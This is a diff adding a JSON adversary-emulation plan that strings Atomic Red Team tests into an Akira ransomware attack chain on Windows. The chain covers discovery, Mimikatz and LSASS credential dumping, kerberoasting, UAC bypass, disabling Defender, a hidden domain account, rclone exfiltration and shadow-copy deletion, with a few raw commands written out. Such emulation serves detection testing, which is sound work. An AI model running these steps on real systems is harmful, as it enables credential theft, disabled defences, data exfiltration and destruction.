@@ -1,0 +1,215 @@
+{
+  "name": "Akira Ransomware",
+  "description": "Akira ransomware is a sophisticated type of malicious software that encrypts a victim's files, deletes shadow copies, and provides instructions for data recovery and ransom payment.",
+  "operating_system":"windows",
+  "AtomicTests": [
+    {
+      "TestNumber": 1,
+      "Description": "Windows - Discover domain trusts with nltest",
+      "Command": "Invoke-AtomicTest T1482 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 2,
+      "Description": "Basic Permission Groups Discovery Windows (Local)",
+      "Command": "Invoke-AtomicTest T1069.001 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 3,
+      "Description": "Basic Permission Groups Discovery Windows (Domain)",
+      "Command": "Invoke-AtomicTest T1069.002 -TestNumbers 1"
+    },
+    {
+      "TestNumber": 4,
+      "Description": "Remote System Discovery with nltest",
+      "Command": "Invoke-AtomicTest T1018 -TestNumbers 3"
+    },
+    {
+      "TestNumber": 5,
+      "Description": "Process Discovery with tasklist",
+      "Command": "Invoke-AtomicTest T1057 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 6,
+      "Description": "Domain Trust Discovery - Get Prerequisites and Execute",
+      "Commands": [
+        "Invoke-AtomicTest T1482 -TestNumbers 4 -GetPrereqs",
+        "Invoke-AtomicTest T1482 -TestNumbers 4",
+        "Invoke-AtomicTest T1482 -TestNumbers 5"
+      ]      
+    },
+    {
+      "TestNumber": 7,
+      "Description": "Network Service Discovery (advanced ip scanner)",
+      "Commands": [
+        "Invoke-WebRequest -Uri \"https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe\" -OutFile \"C:\\temp\\Advanced_IP_Scanner_2.5.4594.1.exe\"",
+        "C:\\temp\\Advanced_IP_Scanner_2.5.4594.1.exe /SP- /VERYSILENT",
+        "cmd.exe /c \"C:\\Program Files (x86)\\Advanced IP Scanner\\advanced_ip_scanner_console.exe\" \"/r:10.10.10.1-10.10.10.255\""
+      ]
+    },
+    {
+      "TestNumber": 8,
+      "Description": "System Network Configuration Discovery on Windows",
+      "Command": "Invoke-AtomicTest T1016 -TestNumbers 1"
+    },
+    {
+      "TestNumber": 9,
+      "Description": "Offline Credential Theft With Mimikatz",
+      "Commands": [
+        "Invoke-AtomicTest T1003.001 -TestNumber 6 -GetPrereqs",
+        "Invoke-AtomicTest T1003.001 -TestNumber 6"
+      ]
+    },
+    {
+      "TestNumber": 10,
+      "Description": "Dump LSASS.exe Memory using ProcDump",
+      "Commands": [
+        "Invoke-AtomicTest T1003.001 -TestNumber 1 -GetPrereqs ",
+        "Invoke-AtomicTest T1003.001 -TestNumber 1"
+      ]
+    },
+    {
+      "TestNumber": 11,
+      "Description": "Dump Credentials using Lazagne",
+      "Commands": [
+        "Invoke-AtomicTest T1555.003 -TestNumber 3 -GetPrereqs",
+        "Invoke-AtomicTest T1555.003 -TestNumber 3"
+      ]
+    },
+    {
+      "TestNumber": 12,
+      "Description": "Dump Credentials using esentutl.exe from Chrome",
+      "Commands": [
+        "Invoke-AtomicTest T1555.003 -TestNumber 17 -GetPrereqs",
+        "Invoke-AtomicTest T1555.003 -TestNumber 17"
+      ]
+    },
+    {
+      "TestNumber": 13,
+      "Description": "Cached Credential Dump via Cmdkey",
+      "Command": "Invoke-AtomicTest T1003.005"
+    },
+    {
+      "TestNumber": 14,
+      "Description": "Create shortcut to cmd in startup folders",
+      "Command": "Invoke-AtomicTest T1547.009 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 15,
+      "Description": "Scheduled Task Startup Script",
+      "Command": "Invoke-AtomicTest T1053.005 -TestNumbers 1"
+    },
+    {
+      "TestNumber": 16,
+      "Description": "WinPwn - UAC Bypass ccmstp technique",
+      "Command": "Invoke-AtomicTest T1548.002 -TestNumbers 19"
+    },
+    {
+      "TestNumber": 17,
+      "Description": "Rubeus kerberoast",
+      "Commands": [
+        "Invoke-AtomicTest T1558.003 -TestNumbers 2 -GetPrereqs",
+        "Invoke-AtomicTest T1558.003 -TestNumbers 2"]
+    },
+    {
+      "TestNumber": 18,
+      "Description": "SeDebugPrivilege token duplication",
+      "Command": "Invoke-AtomicTest T1134.001 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 19,
+      "Description": "Copy and Execute File with PsExec",
+      "Commands": [
+        "Invoke-AtomicTest T1021.002 -TestNumbers 3 -GetPrereqs",
+        "Invoke-AtomicTest T1021.002 -TestNumbers 3"
+      ]
+    },
+    {
+      "TestNumber": 20,
+      "Description": "Create Account: Domain Account - Username itadm",
+      "Commands": [
+        "net user itadm \"T1136_pass123!\" /add /domain ",
+        "Invoke-AtomicTest T1136.002 -TestNumbers 1"
+      ]
+    },
+    {
+      "TestNumber": 21,
+      "Description": "Create Account: Domain Account - Powershell",
+      "Command": "Invoke-AtomicTest T1136.002 -TestNumbers 3"
+    },
+    {
+      "TestNumber": 22,
+      "Description": "Impair Defenses: Disable or Modify Tools - Akira threat actors use BYOVD attacks to disable antivirus software",
+      "Commands": [
+        "Invoke-AtomicTest T1562.001 -TestNumbers 29 -GetPrereqs",
+        "Invoke-AtomicTest T1562.001 -TestNumbers 29"
+      ]
+    },
+    {
+      "TestNumber": 23,
+      "Description": "Impair Defenses: Disable or Modify Tools - Disable Defender",
+      "Commands": [
+        "Invoke-AtomicTest T1562.001 -TestNumbers 16",
+        "Invoke-AtomicTest T1562.001 -TestNumbers 18",
+        "Invoke-AtomicTest T1562.001 -TestNumbers 27"
+      ]
+    },
+    {
+      "TestNumber": 24,
+      "Description": "Disable Microsoft Defender Firewall via Registry",
+      "Command": "Invoke-AtomicTest T1562.004 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 25,
+      "Description": "Remote Access Software - AnyDesk Files Detected Test on Windows",
+      "Command": "Invoke-AtomicTest T1219 -TestNumbers 2"
+    },
+    {
+      "TestNumber": 26,
+      "Description": "ngrok Proxy Service",
+      "Commands": [
+        "ping -n 1 tunnel.ngrok.com",
+        "tnc tunnel.ngrok.com -port 443"
+      ]
+    },
+    {
+      "TestNumber": 27,
+      "Description": "Archive Collected Data: Archive via Utility - with Win-rar and password protected",
+      "Commands": [
+        "Invoke-AtomicTest T1560.001 -TestNumbers 1 -GetPrereqs",
+        "Invoke-AtomicTest T1560.001 -TestNumbers 1",
+        "Invoke-AtomicTest T1560.001 -TestNumbers 2"
+      ]
+    },
+    {
+      "TestNumber": 28,
+      "Description": "Exfiltration Over Alternative Protocol - FTP - Rclone",
+      "Command": [
+        "Invoke-AtomicTest T1048.003 -TestNumbers 7 -GetPrereqs",
+        "Invoke-AtomicTest T1048.003 -TestNumbers 7"
+      ]
+    },
+    {
+      "TestNumber": 29,
+      "Description": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
+      "Commands": [
+        "Invoke-AtomicTest T1567.002 -GetPrereqs",
+        "Invoke-AtomicTest T1567.002"
+      ]
+    },
+    {
+      "TestNumber": 30,
+      "Description": "PureLocker Ransom Note",
+      "Command": "Invoke-AtomicTest T1486 -TestNumbers 5"
+    },
+    {
+      "TestNumber": 31,
+      "Description": "Akira Ransomware drop Files with .akira Extension and Ransomnote",
+      "Command": "Invoke-AtomicTest T1486 -TestNumbers 10"
+    },
+    {
+      "TestNumber": 32,
+      "Description": "Windows - Delete Volume Shadow Copies with Powershell",
+      "Command": "Invoke-AtomicTest T1490 -TestNumbers 5"
+    }
+  ]
+}
